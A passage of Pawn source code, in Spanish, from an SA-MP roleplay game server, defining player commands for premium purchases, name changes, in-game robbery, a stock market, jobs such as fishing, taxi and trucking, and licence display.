	ShowPlayerDialog(playerid, DIALOGO_SANTIAGO, DIALOG_STYLE_LIST, "Comando VIP - Premiums", "50 Vida {008000}[10 ZZCASH]\n80 Vida {008000}[15 ZZCASH]\n100 Vida + 100 Armadura {008000}[30 ZZCASH]\nFull GAS + Bateria + Reparacion {008000}[65 ZZCASH]\nEscopeta - 30 Balas {008000}[25 ZZCASH]\nDesert - 40 Balas {008000}[50 ZZCASH]\nAK47 - 60 Balas {008000}[125 ZZCASH]\nM4A1 - 60 Balas {008000}[145 ZZCASH]\nMP5 - 90 Balas {008000}[85 ZZCASH]\nSniper - 5 Balas {008000}[350 ZZCASH]\nLimpieza de Antecedentes {008000}[1500 ZZCASH]\nImpuesto Coche 1 pagado por 2 meses {008000}[5000 ZZCASH]\nImpuesto Coche 2 pagado por 2 meses {008000}[5000 ZZCASH]\nImpuesto Coche 3 pagado por 2 meses {008000}[5000 ZZCASH]\nImpuesto Coche 4 pagado por 2 meses {008000}[5000 ZZCASH]\nImpuesto Casa 1 pagado por 2 meses {008000}[7000 ZZCASH]\nImpuesto Casa 2 pagado por 2 meses {008000}[7000 ZZCASH]\nImpuesto Negocio 1 pagado por 2 meses {008000}[8000 ZZCASH]\nImpuesto Negocio 2 pagado por 2 meses {008000}[8000 ZZCASH]", "Aceptar", "Cancelar");
	return 1;
}
COMMAND:beneficios2(playerid, params[])
{
	ShowPlayerDialog(playerid, DIALOGO_BENEFICIOS_PREMIUM, DIALOG_STYLE_LIST, "Items Premium", "Cambio de nombre {008000}[1000 ZZCASH]\nSubir Nivel +1 {008000}[4500 ZZCASH]\n20.000$ {008000}[1000 ZZCASH]", "Aceptar", "Cancelar");
	return 1;
}
COMMAND:cambiarnombre(playerid, params[])
{
	if(!cuenta[playerid][cDonar][1])return Mensaje(playerid, COLOR_ROJO, "Usted no tiene Item cambio de nombre.");
	new usuario[MAX_PLAYER_NAME], consulta[128];
	if(sscanf(params, "s[24]", usuario))return Mensaje(playerid, COLOR_ROJO, "Utiliza: /cambiarnombre [Nombre_Apellido] RECUERDA PONER EL _");
	
	if(strlen(usuario) < 10 || strlen(usuario) > 24)return Mensaje(playerid, COLOR_ROJO, "Escriba bien el nombre entre 10 y 24 caracteres.");
	
	new tmp[24];
	mysql_real_escape_string(usuario, tmp, servidor[mysqlControl]);
	mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "SELECT nombre FROM zz_usuarios WHERE nombre ='%s';", tmp);
	mysql_query(servidor[mysqlControl], consulta, true);
	
	if(!cache_get_row_count())
	{
		mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "UPDATE zz_usuarios SET nombre='%s' WHERE id='%d';", tmp, cuenta[playerid][cUnico]);
		mysql_query(servidor[mysqlControl], consulta, false);		
		
		cuenta[playerid][cDonar][1] = 0;
		SetPlayerName(playerid, tmp);
		
		//casas
		if(cuenta[playerid][cCasa] != 9999)
		{
			format(casa[cuenta[playerid][cCasa]][hOwner], sizeof(tmp), "%s", PlayerName(playerid));
			ActualizaCasa(cuenta[playerid][cCasa]);
			OnPropTextdrawUpdate(cuenta[playerid][cCasa]);
		}
		if(cuenta[playerid][cCasa2] != 9999)
		{
			format(casa[cuenta[playerid][cCasa2]][hOwner], sizeof(tmp), "%s", PlayerName(playerid));
			ActualizaCasa(cuenta[playerid][cCasa2]);
			OnPropTextdrawUpdate(cuenta[playerid][cCasa2]);
		}
		//negocios
		if(cuenta[playerid][cNegocio] != 9999)
		{
			format(negocio[cuenta[playerid][cNegocio]][bOwner], sizeof(tmp), "%s", Nombre(playerid));
			ActualizaNegocio(cuenta[playerid][cNegocio]);
			OnBizzTextdrawUpdate(cuenta[playerid][cNegocio]);
		}
		if(cuenta[playerid][cNegocio2] != 9999)
		{
			format(negocio[cuenta[playerid][cNegocio2]][bOwner], sizeof(tmp), "%s", Nombre(playerid));
			ActualizaNegocio(cuenta[playerid][cNegocio2]);
			OnBizzTextdrawUpdate(cuenta[playerid][cNegocio2]);
		}
		//autos
		if(cuenta[playerid][cCoche])
		{
			format(autos[cuenta[playerid][cCoche]][cOwner], sizeof(tmp), "%s", Nombre(playerid));
			ActualizaVehiculo(cuenta[playerid][cCoche]);
		}
		if(cuenta[playerid][cCoche2])
		{
			format(autos[cuenta[playerid][cCoche2]][cOwner], sizeof(tmp), "%s", Nombre(playerid));
			ActualizaVehiculo(cuenta[playerid][cCoche2]);
		}
		if(cuenta[playerid][cCoche3])
		{
			format(autos[cuenta[playerid][cCoche3]][cOwner], sizeof(tmp), "%s", Nombre(playerid));
			ActualizaVehiculo(cuenta[playerid][cCoche3]);
		}
		if(cuenta[playerid][cCoche4])
		{
			format(autos[cuenta[playerid][cCoche4]][cOwner], sizeof(tmp), "%s", Nombre(playerid));
			ActualizaVehiculo(cuenta[playerid][cCoche4]);
		}
		
		Mensaje(playerid, COLOR_VERDE, "Usted cambio su nombre satisfactoriamente.");
	}else Mensaje(playerid, COLOR_ROJO, "Este nombre no esta disponible.");
	return 1;
}
COMMAND:beneficios(playerid, params[])
{
	if(cuenta[playerid][cDonador])return Mensaje(playerid, COLOR_ROJO, "Ya usted posee una cuenta PREMIUM.");
	new cadena[86 * sizeof(premiums)];
	for(new i=0; i<sizeof(premiums); i++)
	{
		format(cadena, sizeof(cadena), "%s\n{ffff00}%s{ffffff} costo: %d ZZcash - tiempo: %s", cadena, premiums[i][vipNombre], premiums[i][vipCosto], generarTiempo(premiums[i][vipTiempo]));
	}
	ShowPlayerDialog(playerid, DIALOGO_PAQUETES_PREMIUM, DIALOG_STYLE_LIST, "Cuentas PREMIUM's", cadena, "Aceptar", "Salir");
	return 1;
}
COMMAND:bolsadeshabilitadisimolasd(playerid, params[])
{
	new acc, codig, cantid, string[126];
	if(sscanf(params, "d", acc))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /bolsa [1.Empresas - 2.Acciones - 3.Comprar - 4.Retirar]");
	switch(acc)
	{
		case 1:
		{
			new cadena[2048];
			for(new i=0; i<sizeof(negocio); i++)
			{
				if(!negocio[i][bOwned]) continue;
				format(cadena, sizeof(cadena), "%s\n\t[%s]\t%s - %s - {008000}%d${ffffff} - %d", cadena, (!negocio[i][bEstado]) ? ("{ff0000}BAJADA{ffffff}"):("{008000}SUBIDA{ffffff}"), negocio[i][bName], negocio[i][bOwner], negocio[i][bPrecioFinal], i);
			}
			ShowPlayerDialog(playerid, DIALOGO_DEFAULT, DIALOG_STYLE_MSGBOX, "Estado - Negocio - Propietario - Costo Accion - Codigo", cadena, "Aceptar", "");
		}
		case 2:
		{
			new cadena[732], encontro;
			for(new k=0; k<8; k++)
			{
				new i = acciones[playerid][aAccTipo][k];
				if(!i)continue;
				format(cadena, sizeof(cadena), "%s\n\t[%s]\t%s - %s - {008000}%d${ffffff} - %d - {008000}%d${ffffff}", cadena, (!negocio[i][bEstado]) ? ("{ff0000}BAJADA{ffffff}"):("{008000}SUBIDA{ffffff}"), negocio[i][bName], negocio[i][bOwner], negocio[i][bPrecioFinal], acciones[playerid][aAccCantidad][k], acciones[playerid][aAccCantidad][k] * negocio[i][bPrecioFinal]);
				encontro++;
			}
			if(!encontro)Mensaje(playerid, COLOR_ROJO, "Usted no tiene acciones.");
			else ShowPlayerDialog(playerid, DIALOGO_DEFAULT, DIALOG_STYLE_MSGBOX, "Estado - Negocio - Propietario - Costo Accion - Acciones", cadena, "Aceptar", "");
		}
		case 3:
		{
			if(sscanf(params, "ddd", acc, codig, cantid))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /bolsa [3.Comprar] [Codigo] [Cantidad]");
			if(!negocio[codig][bOwned])return Mensaje(playerid, COLOR_ROJO, "Este negocio no tiene dueño.");
			if(cantid < 1 || cantid > 2000)return Mensaje(playerid, COLOR_ROJO, "Cantidad minima 1, cantidad maxima 2000");
			for(new k=0; k<8; k++)
			{
				if(codig == acciones[playerid][aAccTipo][k])
				{
					new total = cantid * negocio[codig][bPrecioFinal];
					if(obtenerDinero(playerid) < total)return Mensaje(playerid, COLOR_ROJO, "No tienes dinero para comprar esta cantidad de acciones.");
					if(acciones[playerid][aAccCantidad][k] > 9000)return Mensaje(playerid, COLOR_ROJO, "No puedes comprar mas acciones aqui.");
					
					pierdeDinero(playerid, total);
					acciones[playerid][aAccCantidad][k] += cantid;
					
					format(string, sizeof(string), "Has comprado %d acciones de la empresa %s, inversion total %d$.", cantid, negocio[codig][bName], total);
					Mensaje(playerid, COLOR_GRIS3, string);
					return 1;
				}
			}
			for(new k=0; k<8; k++)
			{
				if(!acciones[playerid][aAccTipo][k])
				{
					new total = cantid * negocio[codig][bPrecioFinal];
					if(obtenerDinero(playerid) < total)return Mensaje(playerid, COLOR_ROJO, "No tienes dinero para comprar esta cantidad de acciones.");
					if(acciones[playerid][aAccCantidad][k] > 9000)return Mensaje(playerid, COLOR_ROJO, "No puedes comprar mas acciones aqui.");
					
					pierdeDinero(playerid, total);
					acciones[playerid][aAccTipo][k] = codig;
					acciones[playerid][aAccCantidad][k] += cantid;
					
					format(string, sizeof(string), "Has comprado %d acciones de la empresa %s, inversion total %d$.", cantid, negocio[codig][bName], total);
					Mensaje(playerid, COLOR_GRIS3, string);
					return 1;
				}
			}
			Mensaje(playerid, COLOR_ROJO, "Usted no puede comprar acciones de esta empresa maximas empresas 8.");
		}
		case 4:
		{
			new cadena[732], encontro;
			for(new k=0; k<8; k++)
			{
				if(!acciones[playerid][aAccTipo][k])continue;
				format(cadena, sizeof(cadena), "%s\nEmpresa: %s - Acciones: %d - Ganancias: %d$", cadena, negocio[acciones[playerid][aAccTipo][k]][bName], acciones[playerid][aAccCantidad][k], acciones[playerid][aAccCantidad][k] * negocio[acciones[playerid][aAccTipo][k]][bPrecioFinal]);
				encontro++;
			}
			if(!encontro)Mensaje(playerid, COLOR_ROJO, "Usted no tiene acciones.");
			else ShowPlayerDialog(playerid, DIALOGO_BOLSA, DIALOG_STYLE_LIST, "Retirar Acciones", cadena, "Aceptar", "Salir");
		}
		default: Mensaje(playerid, COLOR_GRIS2, "Utiliza: /bolsa [1.Empresas - 2.Acciones - 3.Comprar - 4.Retirar]");
	}
	return 1;
}
COMMAND:robar(playerid, params[])
{
	if(Gobierno(playerid) || Team_LSPD(playerid) || Team_FBI(playerid))return Mensaje(playerid, COLOR_GRIS2, "Usted no puede usar este comando.");
	if(cuenta[playerid][cTrabajo] != 15)return Mensaje(playerid, COLOR_GRIS2, "Usted no es ladron.");
	new string[126], item, usuario;
	if(sscanf(params, "d", item))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /robar [1- Jugador 2- Negocio 3- Casa 4- Auto]");
	if(cuenta[playerid][cRobo] > gettime())
	{
		format(string, sizeof(string), "Debes esperar %s para volver a usar este comando.", generarTiempo(cuenta[playerid][cRobo] - gettime()));
		Mensaje(playerid, COLOR_ROJO, string);
		return 1;
	}
	if(!Maskuse[playerid])return Mensaje(playerid, COLOR_ROJO, "Debes tener una mascara, proteje tu identidad!");
	if(cuenta[playerid][selecciono])return Mensaje(playerid, COLOR_ROJO, "Usted esta en pleno robo.");
	
	switch(item)
	{
		case 1:
		{
			if(sscanf(params, "p< >du", item, usuario))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /robar [1] [Usuario]");
			if(!IsPlayerConnected(usuario))return Mensaje(playerid, COLOR_ROJO, "Este jugador no esta conectado.");
			if(playerid == usuario)return Mensaje(playerid, COLOR_ROJO, "Usted no puede seleccionarse.");
			if(!GetPlayerWeapon(playerid))return Mensaje(playerid, COLOR_ROJO, "Debes tener un arma en mano para robar.");
			
			if(dDistanciaJugador(3.0, playerid, usuario))
			{
				peticiones[usuario] = 6;
				peticionIDofertante[usuario] = playerid;
				peticionPrecio[usuario] = random(obtenerDinero(usuario));
				
				if(peticionPrecio[usuario] >= 4000) peticionPrecio[usuario] = random(4000);
				booleano[Facturing]{usuario} = true;
				
				format(string, sizeof(string), "Has enviado una peticion de robo a %s por %d$.", PlayerName(playerid), peticionPrecio[usuario]);
				Mensaje(playerid, COLOR_GRIS2, string);
				format(string, sizeof(string), "\t\t{ffffff}-- Peticion de robo --\t\t\n\t{ffffff}* %s Ofrece robarle %d$.\t\t\n\t{ffffff}¿Que desea hacer?", PlayerName(playerid), peticionPrecio[usuario]);
				EnviarPeticion(usuario, string);
			}else return Mensaje(playerid, COLOR_ROJO, "Debe estar cerca de la persona que robara.");
		}
		case 2:
		{
			if(!GetPlayerWeapon(playerid))return Mensaje(playerid, COLOR_ROJO, "Debes tener un arma en mano para robar.");
			for(new i=0; i<sizeof(negocio); i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 10.0, negocio[i][bExitx], negocio[i][bExity], negocio[i][bExitz]))
				{
					SetPlayerCheckpoint(playerid, negocio[i][bExitx], negocio[i][bExity], negocio[i][bExitz], 2.0);
					cuenta[playerid][selecciono] = 1;
					cuenta[playerid][selecciono2] = i;
					Mensaje(playerid, COLOR_ROJO, "Dirijase al punto rojo para robar.");
					return 1;
				}
			}
			Mensaje(playerid, COLOR_GRIS2, "Usted no esta dentro de un negocio.");
		}
		case 3:
		{
			if(!GetPlayerWeapon(playerid))return Mensaje(playerid, COLOR_ROJO, "Debes tener un arma en mano para robar.");
			for(new i=0; i<sizeof(casa); i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 10.0, casa[i][hEntrancex], casa[i][hEntrancey], casa[i][hEntrancez]))
				{
					if(!casa[i][hOwned])return Mensaje(playerid, COLOR_ROJO, "Esta casa no tiene nada de valor.");
					SetPlayerCheckpoint(playerid, casa[i][hEntrancex], casa[i][hEntrancey], casa[i][hEntrancez], 2.0);
					cuenta[playerid][selecciono] = 1;
					cuenta[playerid][selecciono2] = i;
					Mensaje(playerid, COLOR_ROJO, "Dirijase al punto rojo para robar.");
					return 1;
				}
			}
			Mensaje(playerid, COLOR_GRIS2, "Usted no esta cerca de una casa.");
		}
		case 4:
		{
			if(!booleano[Ganzuas]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No tienes ganzúas!");
			if(!IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) != PLAYER_STATE_DRIVER)return Mensaje(playerid, COLOR_GRIS2, "Usted no es el conductor."); 
			new vehicle = GetPlayerVehicleID(playerid);
			if(!EsComprable(vehicle))return Mensaje(playerid, COLOR_ROJO, "Este vehiculo no puede ser robado.");
			
			format(string, sizeof(string), "* %s utiliza unas ganzúas y cruza los cables.", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			GameTextForPlayer(playerid, "~w~haciendo puente....", 2500, 3);
			TogglePlayerControllable(playerid, false);
			SetTimerEx("encenderMotor", 3000, false, "d", playerid);
			
			new zona[MAX_ZONE_NAME];
			GetPlayer2DZone(playerid, zona, MAX_ZONE_NAME);
			format(string, sizeof(string), "** Central: Se ah detectado un robo vehicular en %s, el GPS del vehiculo marcara su posicion.", zona);
			SendRadioMessage(1, TEAM_RADIO_COLOR, string);
			
			SetPlayerColor(playerid, COLOR_ROJO);
			cuenta[playerid][selecciono] = 2;
			TextoInformatico(20, playerid, "~r~Dirije este vehiculo robado al punto marcado en el mapa.");
			SetPlayerCheckpoint(playerid, 2611.6138, -2201.5718, -0.2188, 5.0);
		}
		default: Mensaje(playerid, COLOR_ROJO, "Usted ha ingresado un Item invalido.");
	}
	return 1;
}

COMMAND:pescar(playerid, params[])
{
	if(cuenta[playerid][cTrabajo] != 11)return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a este departamento.");
	if(!cuenta[playerid][servicio])return Mensaje(playerid, COLOR_ROJO, "Usted no se encuentra en /servicio.");
	if(cuenta[playerid][selecciono])return Mensaje(playerid, COLOR_ROJO, "Usted ya esta pescando.");
	new vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 453)
	{
		comenzarPescar(playerid);
	}else return Mensaje(playerid, COLOR_ROJO, "Debe estar dentro del vehiculo de su trabajo.");
	return 1;
}
COMMAND:basura(playerid, params[])
{
	if(cuenta[playerid][cTrabajo] != 10)return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a este departamento.");
	if(!cuenta[playerid][servicio])return Mensaje(playerid, COLOR_ROJO, "Usted no se encuentra en /servicio.");
	if(cuenta[playerid][selecciono])return Mensaje(playerid, COLOR_ROJO, "Usted ya esta en una ruta.");
	new vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 408)
	{
		new id = cuenta[playerid][selecciono2] = random(sizeof(trabBasurero));
		cuenta[playerid][selecciono] = 1;
		SetPlayerCheckpoint(playerid, trabBasurero[id][basPos][0], trabBasurero[id][basPos][1], trabBasurero[id][basPos][2], 3.0);
		TextoInformatico(20, playerid, "Avance al siguiente bote de basura para comenar su trabajo.");
	}else return Mensaje(playerid, COLOR_ROJO, "Debe estar dentro del vehiculo de su trabajo.");
	return 1;
}
COMMAND:tarifa(playerid, params[])
{
	if(cuenta[playerid][cTrabajo] != 9)return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a este departamento.");
	if(!cuenta[playerid][servicio])return Mensaje(playerid, COLOR_ROJO, "Usted no se encuentra en /servicio.");
	new jugador, precio, vehicle = GetPlayerVehicleID(playerid);
	if(sscanf(params, "ud", jugador, precio))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /tarifa [Usuario] [Precio]");
	if(!IsPlayerConnected(jugador) || jugador == playerid)return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado o es usted mismo.");
	if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 409 || GetVehicleModel(vehicle) == 420)
	{
		if(dDistanciaJugador(10.0, playerid, jugador))
		{
			if(booleano[Facturing]{jugador})return Mensaje(playerid, COLOR_ROJO, "Este jugador está en otra tarea, espera.");
			if(precio < 1 || precio > 500)return Mensaje(playerid, COLOR_ROJO, "La tarifa minima es de 1$ y la maxima es de 500$");
			
			peticiones[jugador] = 4;
			peticionIDofertante[jugador] = playerid;
			peticionPrecio[jugador] = precio;
			
			booleano[Facturing]{jugador} = true;
			new string[126];
			format(string, sizeof(string), "\t\t{ffffff}-- Ofrecimiento de servicio --\t\t\n\t{ffffff}* %s ofrece llevarlo por un valor de %d.\n¿Que desea hacer?", PlayerName(playerid), precio);
			EnviarPeticion(jugador, string);
		}else return Mensaje(playerid, COLOR_ROJO, "Debe estar cerca de su cliente.");
	}else return Mensaje(playerid, COLOR_ROJO, "Debe estar dentro del vehiculo de su trabajo.");
	return 1;
}
COMMAND:ruta(playerid, params[])
{
	if(cuenta[playerid][cTrabajo] != 8)return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a este departamento.");
	if(!cuenta[playerid][servicio])return Mensaje(playerid, COLOR_ROJO, "Usted no se encuentra en /servicio.");
	if(cuenta[playerid][selecciono])return Mensaje(playerid, COLOR_ROJO, "Usted ya esta en una ruta.");
	new vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 538)
	{
		SetPlayerCheckpoint(playerid, 2646.5356, 2178.7378, -0.6937, 7.0);
		TextoInformatico(25, playerid, "La estacion fue marcada en su ~g~minimapa~w~.");
	}else return Mensaje(playerid, COLOR_ROJO, "Debe estar dentro del vehiculo de su trabajo.");
	return 1;
}
COMMAND:pizza(playerid, params[])
{
	if(cuenta[playerid][cTrabajo] != 7)return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a este departamento.");
	if(!cuenta[playerid][servicio])return Mensaje(playerid, COLOR_ROJO, "Usted no se encuentra en /servicio.");
	if(cuenta[playerid][selecciono])return Mensaje(playerid, COLOR_ROJO, "Usted ya esta en una ruta.");
	new vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 448)
	{
		static entrega;
		for(new i=1; i<sizeof(casa); i++)
		{
			entrega = random(sizeof(casa));
			if(casa[entrega][hOwned])
			{
				cuenta[playerid][selecciono] = entrega;
				SetPlayerCheckpoint(playerid, casa[entrega][hEntrancex], casa[entrega][hEntrancey], casa[entrega][hEntrancez], 2.0);
				new string[126];
				format(string, sizeof(string), "Usted se le asigno una entrega para ~g~%s ~w~Su destino fue marcado en su ~g~minimapa~w~.", casa[entrega][hOwner]);
				TextoInformatico(25, playerid, string);
				break;
			}
		}
	}else return Mensaje(playerid, COLOR_ROJO, "Debe estar dentro del vehiculo de su trabajo.");
	return 1;
}

COMMAND:cosechar(playerid, params[])
{
	if(cuenta[playerid][cTrabajo] != 6)return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a este departamento.");
	if(!cuenta[playerid][servicio])return Mensaje(playerid, COLOR_ROJO, "Usted no se encuentra en /servicio.");
	if(cuenta[playerid][selecciono])return Mensaje(playerid, COLOR_ROJO, "Usted ya esta en una ruta.");
	new vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 532)
	{
		comenzarCosechar(playerid);
	}else return Mensaje(playerid, COLOR_ROJO, "Debe estar dentro del vehiculo de su trabajo.");
	return 1;
}
COMMAND:recorrido(playerid, params[])
{
	if(cuenta[playerid][cTrabajo] != 5)return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a este departamento.");
	if(!cuenta[playerid][servicio])return Mensaje(playerid, COLOR_ROJO, "Usted no se encuentra en /servicio.");
	if(cuenta[playerid][selecciono])return Mensaje(playerid, COLOR_ROJO, "Usted ya esta en una ruta.");
	new vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 431)
	{
		new string[42 * sizeof(trabBuses)];
		for(new i=1; i<sizeof(trabBuses); i++)
		{
			format(string, sizeof(string), "%s\n%s - {008000}%d$", string, trabBuses[i][busLugar], trabBuses[i][busPaga]);
		}
		ShowPlayerDialog(playerid, DIALOGO_CONDUCTOR_BUS, DIALOG_STYLE_LIST, "Localizaciones", string, "Aceptar", "Cancelar");
	}else return Mensaje(playerid, COLOR_ROJO, "Debe estar dentro del vehiculo de su trabajo.");
	return 1;
}
COMMAND:limpiarcalle(playerid, params[])
{
	if(cuenta[playerid][cTrabajo] != 4)return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a este departamento.");
	if(!cuenta[playerid][servicio])return Mensaje(playerid, COLOR_ROJO, "Usted no se encuentra en /servicio.");
	if(cuenta[playerid][selecciono])return Mensaje(playerid, COLOR_ROJO, "Usted ya esta en una ruta.");
	new vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 574)
	{
		new string[42 * sizeof(trabBarrendero)];
		for(new i=1; i<sizeof(trabBarrendero); i++)
		{
			format(string, sizeof(string), "%s\n%s - {008000}%d$", string, trabBarrendero[i][barrLugar], trabBarrendero[i][barrPaga]);
		}
		ShowPlayerDialog(playerid, DIALOGO_BARRENDERO, DIALOG_STYLE_LIST, "Localizaciones", string, "Aceptar", "Cancelar");
	}else return Mensaje(playerid, COLOR_ROJO, "Debe estar dentro del vehiculo de su trabajo.");
	return 1;
}
COMMAND:cargar(playerid, params[])
{
	if(cuenta[playerid][cTrabajo] != 3)return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a este departamento.");
	if(!cuenta[playerid][servicio])return Mensaje(playerid, COLOR_ROJO, "Usted no se encuentra en /servicio.");
	if(cuenta[playerid][selecciono])return Mensaje(playerid, COLOR_ROJO, "Usted ya esta en una ruta.");
	new vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 456 || GetVehicleModel(vehicle) == 414)
	{
		new string[52 * sizeof(trabCamionero)];
		for(new i=1; i<sizeof(trabCamionero); i++)
		{
			format(string, sizeof(string), "%s\n%s - {008000}%d$", string, trabCamionero[i][camLugar], trabCamionero[i][camPaga]);
		}
		ShowPlayerDialog(playerid, DIALOGO_TRANSPORTE_CAMIONERO, DIALOG_STYLE_LIST, "Localizaciones", string, "Aceptar", "Cancelar");
	}else return Mensaje(playerid, COLOR_ROJO, "Debe estar dentro del vehiculo de su trabajo.");
	return 1;
}
COMMAND:pilotear(playerid, params[])
{
	if(cuenta[playerid][cTrabajo] != 2)return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a este departamento.");
	if(!cuenta[playerid][servicio])return Mensaje(playerid, COLOR_ROJO, "Usted no se encuentra en /servicio.");
	if(cuenta[playerid][selecciono])return Mensaje(playerid, COLOR_ROJO, "Usted ya esta en una ruta.");
	new vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 593)
	{
		new string[42 * sizeof(trabAviador)];
		for(new i=1; i<sizeof(trabAviador); i++)
		{
			format(string, sizeof(string), "%s\n%s - {008000}%d$", string, trabAviador[i][aviLugar], trabAviador[i][aviPaga]);
		}
		ShowPlayerDialog(playerid, DIALOGO_TRANSPORTE_AVIADOR, DIALOG_STYLE_LIST, "Localizaciones", string, "Aceptar", "Cancelar");
	}else return Mensaje(playerid, COLOR_ROJO, "Debe estar dentro del vehiculo de su trabajo.");
	return 1;
}
COMMAND:transportar(playerid, params[])
{
	if(cuenta[playerid][cTrabajo] != 1)return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a este departamento.");
	if(!cuenta[playerid][servicio])return Mensaje(playerid, COLOR_ROJO, "Usted no se encuentra en /servicio.");
	if(cuenta[playerid][selecciono])return Mensaje(playerid, COLOR_ROJO, "Usted ya esta en una ruta.");
	new vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 428)
	{
		new string[42 * sizeof(trabTransportador)];
		for(new i=1; i<sizeof(trabTransportador); i++)
		{
			format(string, sizeof(string), "%s\n%s - {008000}%d$", string, trabTransportador[i][transLugar], trabTransportador[i][transPaga]);
		}
		ShowPlayerDialog(playerid, DIALOGO_TRANSPORTE_VALORES, DIALOG_STYLE_LIST, "Localizaciones", string, "Aceptar", "Cancelar");
	}else return Mensaje(playerid, COLOR_ROJO, "Debe estar dentro del vehiculo de su trabajo.");
	return 1;
}
COMMAND:finservicio(playerid, params[])
{
	if(!cuenta[playerid][cTrabajo])return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted esta desempleado.");
	if(cuenta[playerid][cTrabajo] == 15)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no necesita estar en finservicio.");
	if(cuenta[playerid][servicio])
	{
		new string[126], vehicle = GetPlayerVehicleID(playerid);
		cuenta[playerid][servicio] = false;
		cuenta[playerid][selecciono] = 0;
		SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
		SetVehicleToRespawn(vehicle);
		DisablePlayerCheckpoint(playerid);
		addObjetoTrabajo(playerid, 1, 0.0000, 0.0000, 0.0000);
		RemovePlayerAttachedObject(playerid, 8);
		RemovePlayerAttachedObject(playerid, 9);
		
		ganaDinero(playerid, cuenta[playerid][pagas]);
		format(string, sizeof(string), "Usted ha recaudado ~g~%d$~w~ como ~g~%s~w~.", cuenta[playerid][pagas], trabajos[cuenta[playerid][cTrabajo]][trabNombre]);
		TextoInformatico(25, playerid, string);
		cuenta[playerid][pagas] = 0;
	}
	return 1;
}
COMMAND:licencias(playerid, params[])
{
	new jugador, string[126];
	if(sscanf(params, "u", jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /licencias [Usuario]");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_ROJO, "Este jugador no esta conectado.");
	if(!dDistanciaJugador(5.0, playerid, jugador))return Mensaje(playerid, COLOR_ROJO, "Este jugador esta muy lejos.");
	if(booleano[AdminDuty]{jugador})return Mensaje(playerid, COLOR_ROJO, "Administrador en Servicio.");
	
	ClearChatbox(jugador, 21);
	format(string, sizeof(string), "|__ Licencias de %s __|", PlayerName(playerid));
	Mensaje(jugador, COLOR_BLANCO, string);
	
	Mensaje(jugador, (cuenta[playerid][cLicenciaMoto])?(COLOR_VERDE):(COLOR_ROJO), (cuenta[playerid][cLicenciaMoto])?("Tiene licencia de moto."):("No tiene licencia de moto."));
	Mensaje(jugador, (cuenta[playerid][cLicenciaAuto])?(COLOR_VERDE):(COLOR_ROJO), (cuenta[playerid][cLicenciaAuto])?("Tiene licencia de conduccion."):("No tiene licencia de conduccion."));
	Mensaje(jugador, (cuenta[playerid][cLicenciaVuelo])?(COLOR_VERDE):(COLOR_ROJO), (cuenta[playerid][cLicenciaVuelo])?("Tiene licencia de vuelo."):("No tiene licencia de vuelo."));
	Mensaje(jugador, (cuenta[playerid][cLicenciaBote])?(COLOR_VERDE):(COLOR_ROJO), (cuenta[playerid][cLicenciaBote])?("Tiene licencia de bote."):("No tiene licencia de bote."));
	Mensaje(jugador, (cuenta[playerid][cLicenciaArma])?(COLOR_VERDE):(COLOR_ROJO), (cuenta[playerid][cLicenciaArma])?("Tiene licencia de armas."):("No tiene licencia de armas."));
	
	format(string, sizeof(string), "* %s muestra sus licencias a %s.", PlayerName(playerid), PlayerName(jugador));
	ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	return 1;
}
COMMAND:cajero(playerid, params[])
{
	if(!cuenta[playerid][cTarjeta])return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no tiene una tarjeta de crédito, saque una en el banco.");
	for(new i=0; i<sizeof cajeros; i++)
	{
